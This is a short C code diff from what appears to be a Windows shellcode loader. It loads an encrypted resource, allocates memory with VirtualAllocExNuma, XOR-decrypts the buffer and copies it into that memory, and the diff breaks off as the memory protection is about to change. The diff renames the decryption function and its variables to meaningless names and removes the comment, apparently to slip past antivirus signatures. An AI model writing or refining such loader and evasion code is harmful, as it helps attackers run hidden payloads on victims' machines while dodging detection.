@@ -19,9 +19,9 @@ void laddrems(const char* resName, char** data, DWORD* size) {
 
 
 
-void DecryptXOR(char* codeboy, DWORD codeboyLen, unsigned char* key, DWORD keyLen) {
-    for (DWORD i = 0; i < codeboyLen; i++) {
-        codeboy[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
+void xdecman(char* co1d, DWORD co1dlen, unsigned char* kesu, DWORD key1en) {
+    for (DWORD masu = 0; masu < co1dlen; masu++) {
+        co1d[masu] ^= kesu[masu % key1en]; 
     }
 }
 
@@ -39,7 +39,7 @@ int main() {
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-    DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
+    xdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);
 
     memcpy(memalo, AESCode, AESCodeLen);
     DWORD oldProtect;
